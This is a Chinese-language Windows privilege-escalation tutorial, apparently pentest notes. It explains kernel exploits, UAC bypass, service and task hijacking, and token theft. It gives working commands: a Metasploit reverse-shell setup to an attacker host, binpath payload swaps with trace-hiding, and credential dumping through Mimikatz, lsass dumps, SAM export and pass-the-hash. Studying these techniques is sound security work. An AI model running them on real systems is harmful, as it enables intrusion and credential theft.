#### 概述 (Overview)
在获得 Windows 系统的初步访问权限（如 Webshell 或低权限用户会话）后，通常需要提升权限至管理员 (Administrator) 或系统 (SYSTEM/NT AUTHORITY\SYSTEM) 级别，以便完全控制目标系统、安装持久化后门、访问敏感数据（如 SAM 文件）或进行更深入的内网渗透。

#### 初始 Shell 环境修复 (Initial Shell Environment Fix)

1.  **CMD 命令无法执行分析与解决 (CMD Execution Issues)**
    *   **原因**:
        *   管理员通过策略限制了 CMD 的使用。
        *   `cmd.exe` 文件或相关组件被删除/损坏。
        *   当前用户权限过低，无法执行某些操作。
        *   Webshell 执行环境限制。
    *   **解决方法**:
        *   **查找可写目录**: 使用脚本或 Webshell 文件管理功能查找具有写入权限的目录（避免路径中带空格）。
        *   **上传 `cmd.exe`**: 将本地的 `cmd.exe` 文件上传到找到的可写目录。
        *   **指定 CMD 路径**: 在 Webshell 或反弹 Shell 中，设置命令解释器的路径为上传的 `cmd.exe` 路径。例如，在某些 Webshell 中可能有类似 `setp C:\path\to\writable\dir\cmd.exe` 的命令或配置项。

#### 提权信息收集命令 (Common Info Gathering Commands for PrivEsc)

*   `whoami`: 查看当前用户名。
*   `whoami /groups`: 查看当前用户所属的组。
*   `systeminfo`: 查看操作系统版本、架构、安装日期、已安装补丁 (Hotfix)。
*   `ipconfig /all`: 查看网络配置（IP, 网关, DNS, MAC, 域名）。
*   `net user`: 列出本地用户。
*   `net user <username>`: 查看特定用户信息。
*   `net localgroup administrators`: 查看本地管理员组成员。
*   `netstat -ano`: 查看网络连接、监听端口及关联进程 ID。
*   `tasklist /svc`: 查看运行进程及其关联服务。
*   `taskkill /PID <pid> /F`: 强制结束指定 PID 的进程。
*   `net start`: 列出正在运行的服务。
*   `net stop <service_name>`: 停止服务。
*   `hostname`: 查看计算机名。
*   `quser` 或 `query user`: 查看当前登录的用户会话。
*   `netstat -ano | findstr <port>`: 查找监听特定端口的进程（如 `findstr 3389` 查找 RDP）。
*   `dir c:\programdata\`, `dir "c:\program files\"`, `dir "c:\program files (x86)\"`: 浏览常见安装目录，分析已安装软件（包括杀软）。
*   `wmic product get name, version`: 获取已安装程序列表。
*   `wmic qfe get Caption, Description, HotFixID, InstalledOn`: 列出已安装的补丁及其安装日期。
*   `REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber`: 获取 RDP 监听端口号（十六进制）。
*   `tasklist /svc | findstr "TermService"`: 查找 RDP 服务 (TermService) 对应的进程 PID，再结合 `netstat -ano` 确认端口。

#### 提权方法 (Escalation Techniques)

1.  **利用系统内核溢出漏洞 (Kernel Exploit)**
    *   **原理**: 利用操作系统内核中未修复的漏洞，执行特定代码（Exploit）以获取 SYSTEM 权限。
    *   **分类**:
        *   **远程溢出 (Remote Kernel Exploit)**: 无需本地账户，直接通过网络服务利用内核漏洞（非常罕见且影响巨大）。
        *   **本地溢出 (Local Kernel Exploit)**: 需要先获得目标系统的低权限访问，然后上传并执行本地提权 Exploit。这是最常见的内核提权方式。
    *   **步骤**:
        1.  **信息收集**: 使用 `systeminfo` 获取 OS 版本和已安装补丁列表。
        2.  **漏洞识别**:
            *   **手动比对**: 将补丁列表与已知提权漏洞的补丁编号（KB 号）进行比对。微软安全公告存档: `https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/` (历史)。
            *   **自动化脚本/工具**:
                *   **Windows Exploit Suggester (wesng)**: Python 脚本，根据 `systeminfo` 输出建议可用的内核 Exploit。
                *   **Sherlock**: PowerShell 脚本，查找潜在的本地提权漏洞。`Import-Module .\Sherlock.ps1; Find-AllVulns`。
                *   **Metasploit Post Module**: `post/windows/gather/enum_patches` 或 `multi/recon/local_exploit_suggester`。
            *   **常用漏洞示例 (KB 号)**: KB2592799, KB3000061, KB3143141, MS10-015, MS11-080, MS14-058, MS15-051, MS16-032, MS17-010 (虽然主要用于 RCE 和横向，但有时也涉及权限问题)。
        3.  **获取 Exploit**: 从 GitHub 仓库（如 SecWiki/windows-kernel-exploits, WindowsExploits/Exploits, AusJock/Privilege-Escalation）下载预编译的 Exploit 或源码。
        4.  **上传与执行**: 将 Exploit 上传到目标机器的可写目录，并执行。
    *   **风险**: 内核 Exploit 可能导致系统不稳定或蓝屏 (BSOD)。务必谨慎选择和使用。

2.  **绕过用户账户控制 (Bypass UAC)**
    *   **原理**: UAC 限制了即使是管理员组成员的程序也默认以标准用户权限运行，需要用户明确同意才能提升权限。Bypass UAC 技术利用 Windows 自身机制或漏洞，在不触发 UAC 弹窗的情况下以高权限 (High Integrity) 执行代码。
    *   **适用场景**: 当前用户属于管理员组，但 Shell/进程运行在中等完整性级别 (Medium Integrity)，无法执行需要管理员权限的操作。
    *   **方法**: 利用特定的可信程序（如 `eventvwr.exe`, `fodhelper.exe`, `sdclt.exe`）加载恶意 DLL 或执行命令，这些程序在启动时会自动提升权限且不触发 UAC 提示。
    *   **工具/模块**:
        *   **Metasploit**: `exploit/windows/local/bypassuac`, `exploit/windows/local/bypassuac_eventvwr`, `exploit/windows/local/bypassuac_fodhelper` 等。
        *   **独立工具**: UACMe (包含多种 Bypass 技术)。
    *   **MSF 示例 (ask)**: `ask` 模块会弹出一个看似合法的确认框，诱导用户点击 "Yes" 来执行高权限 Payload。
        ```bash
        use exploit/windows/local/ask
        set SESSION <session_id>
        set LHOST <attacker_ip>
        set LPORT <attacker_port>
        set PAYLOAD windows/meterpreter/reverse_tcp
        # set TECHNIQUE EXE # (或 DLL, POWERSHELL)
        exploit
        # 目标用户点击弹窗后，会获得一个新的高权限 Meterpreter 会话
        ```

3.  **利用系统服务提权 (Service Escalation)**
    *   **不安全的服务权限 (Insecure Service Permissions)**:
        *   **原理**: 如果当前用户对某个以高权限（如 SYSTEM）运行的服务具有修改权限（如 `SERVICE_CHANGE_CONFIG`），则可以将该服务的可执行文件路径 (`binPath`) 修改为恶意程序，然后重启服务以高权限执行恶意代码。
        *   **检测**:
            *   **AccessChk**: Sysinternals 工具。`accesschk.exe -uwcqv "Authenticated Users" * /accepteula` 或 `accesschk.exe -uwcqv "<UserName>" *` 查找用户可修改的服务。
            *   **sc qc <ServiceName>**: 查看服务配置，但需手动检查 ACL。
            *   **PowerShell**: `Get-Acl` 结合服务查询。
        *   **利用**:
            1.  `sc qc "ServiceName"`: 查看原始 `BINARY_PATH_NAME`。
            2.  `sc config "ServiceName" binpath= "C:\path\to\payload.exe"`: 修改服务路径。
            3.  `sc stop "ServiceName"` (如果服务正在运行)。
            4.  `sc start "ServiceName"`: 启动服务，执行 Payload。
            5.  (可选) `sc config "ServiceName" binpath= "<original_path>"`: 恢复原始路径以隐藏痕迹。
        *   **注意**: `net user` 命令不是服务二进制文件，直接用它替换 `binpath` 会导致服务启动失败。需要使用能启动并保持运行的 Payload（如反弹 Shell 程序）或用 `cmd /c "net user ..."`。
    *   **不带引号的服务路径 (Unquoted Service Path)**:
        *   **原理**: 如果服务的 `binPath` 包含空格且没有被引号包围（如 `C:\Program Files\Some Service\service.exe`），Windows 在查找可执行文件时会按顺序尝试：`C:\Program.exe`, `C:\Program Files\Some.exe`, `C:\Program Files\Some Service\service.exe`。如果在靠前的路径（如 `C:\`）有写入权限，可以放置一个名为 `Program.exe` 的恶意程序，它将在服务启动时被优先执行。
        *   **检测**:
            *   `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`: 查找自动启动、路径不在 Windows 目录、且路径未被引号包围的服务。
        *   **利用**: 将 Payload 命名为路径中第一个空格前的部分（如 `Program.exe`），放到对应的上级目录（如 `C:\`）下，然后等待服务重启或手动重启服务。
    *   **DLL 劫持**: 如果服务加载的某个 DLL 不在可信路径且搜索路径可控，可以放置同名恶意 DLL。

4.  **利用计划任务 (Scheduled Tasks)**
    *   **原理**: 如果某个以高权限运行的计划任务所执行的程序或脚本所在的目录对低权限用户可写，则可以用恶意程序替换原程序。当计划任务下次运行时，将以高权限执行恶意代码。
    *   **检测**:
        *   `schtasks /query /fo LIST /v`: 查看所有计划任务的详细信息，关注以高权限用户（如 SYSTEM, Administrators）运行的任务及其执行的程序路径。
        *   `icacls <directory>` 或 `accesschk.exe -dqv "<directory>" -accepteula`: 检查对任务程序所在目录的写入权限。
    *   **利用**: 替换目标程序，等待任务执行。

5.  **令牌窃取/模拟 (Token Stealing/Impersonation)**
    *   **原理**: 在 Windows 中，每个进程都有一个访问令牌 (Access Token)，包含了该进程的安全上下文（用户 SID、组 SID、权限等）。如果能获取到高权限用户（如 SYSTEM 或域管理员）运行的进程的令牌，就可以模拟 (Impersonate) 该用户，从而获得其权限。
    *   **适用场景**: 已获得一定的权限（如 SeImpersonatePrivilege 或 SeDebugPrivilege，通常本地管理员有）。
    *   **方法 (Meterpreter)**:
        1.  `ps`: 列出进程，找到目标高权限用户（如 SYSTEM）运行的进程及其 PID。
        2.  `steal_token <PID>`: 窃取目标进程的令牌。
        3.  `getuid`: 验证当前模拟的用户身份。
        4.  执行需要高权限的操作。
        5.  `rev2self`: 恢复到原始令牌。
    *   **其他工具**: Incognito (集成在 Meterpreter 中), RottenPotatoNG/JuicyPotato (利用 DCOM/RPC 缺陷获取 SYSTEM 令牌)。

#### 提权后操作：获取管理员密码/哈希 (Post-Escalation: Retrieving Admin Credentials)

*   **原因**:
    *   凭据复用：管理员可能在多台机器上使用相同密码。
    *   持久化：使用合法凭据登录比植入后门更隐蔽。
    *   横向移动：利用管理员凭据访问其他系统。
    *   清除痕迹。
*   **方法**:
    1.  **Mimikatz**:
        *   **功能**: 从内存（特别是 `lsass.exe` 进程）中提取明文密码、哈希值 (NTLM Hash)、Kerberos 票据等。
        *   **使用 (需要 SYSTEM 权限)**:
            ```
            mimikatz # privilege::debug  (提升权限)
            mimikatz # sekurlsa::logonpasswords (抓取内存中的凭据)
            ```
        *   **限制**: 现代 Windows 系统（Win10/2016+）默认开启 Credential Guard 或配置了 WDigest 不缓存明文密码，可能无法直接抓取明文，但 NTLM 哈希通常仍可获取。
        *   **离线提取**: 如果无法在目标机运行 Mimikatz，可使用 `procdump` (Sysinternals) 导出 `lsass.exe` 进程的内存 dump 文件 (`procdump64.exe -accepteula -ma lsass.exe lsass.dmp`)，然后在本地使用 Mimikatz 加载 dump 文件分析：`mimikatz # sekurlsa::minidump lsass.dmp` -> `mimikatz # sekurlsa::logonpasswords full`。
    2.  **LaZagne**:
        *   **功能**: 开源密码提取工具，支持从多种应用程序（浏览器、邮件客户端、数据库客户端、Git/SVN、WiFi 配置等）中恢复存储的密码。
        *   **使用**:
            *   `laZagne.exe all`: 尝试提取所有支持应用的密码。
            *   `laZagne.exe browsers`: 仅提取浏览器密码。
            *   `laZagne.exe all -oN output.txt`: 将结果保存到文件。
        *   **依赖**: 可能需要 Python 环境（取决于版本）。
    3.  **直接导出 SAM/SYSTEM 文件**:
        *   **原理**: SAM 文件存储本地用户密码哈希，SYSTEM 文件包含解密 SAM 所需的密钥 (SysKey)。获取这两个文件后可离线破解哈希。
        *   **方法 (需要 SYSTEM 权限)**:
            *   **注册表备份**: `reg save hklm\sam sam.save` 和 `reg save hklm\system system.save`。
            *   **卷影复制 (Volume Shadow Copy)**: `vssadmin create shadow /for=C:` -> 挂载卷影副本 -> 从副本中复制 `Windows\System32\config` 下的 SAM 和 SYSTEM 文件。
            *   **工具**: Pwdump7, gsecdump, Metasploit `post/windows/gather/hashdump` 模块。
        *   **后续**: 使用 Hashcat, John the Ripper, Ophcrack (基于彩虹表) 或 L0phtCrack (LC5/LC7) 等工具离线破解哈希。
    4.  **Pass-the-Hash (PtH)**:
        *   **原理**: 利用获取到的 NTLM 哈希值直接进行远程认证，而无需知道明文密码。
        *   **适用场景**: 横向移动到其他支持 NTLM 认证的 Windows 系统。
        *   **工具**:
            *   **Mimikatz**: `sekurlsa::pth /user:administrator /domain:. /ntlm:<ntlm_hash>` (启动一个带有哈希认证上下文的新进程，如 cmd.exe)。
            *   **Metasploit**: `exploit/windows/smb/psexec` 模块，在 `SMBPass` 处直接填入 NTLM 哈希 (格式通常是 `LMhash:NTLMhash`，如果 LM 不可用，可以是 `aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>`)。
            *   **Impacket (Linux)**: `psexec.py`, `smbexec.py`, `wmiexec.py` 等工具支持 `-hashes <lm_hash>:<ntlm_hash>` 参数。



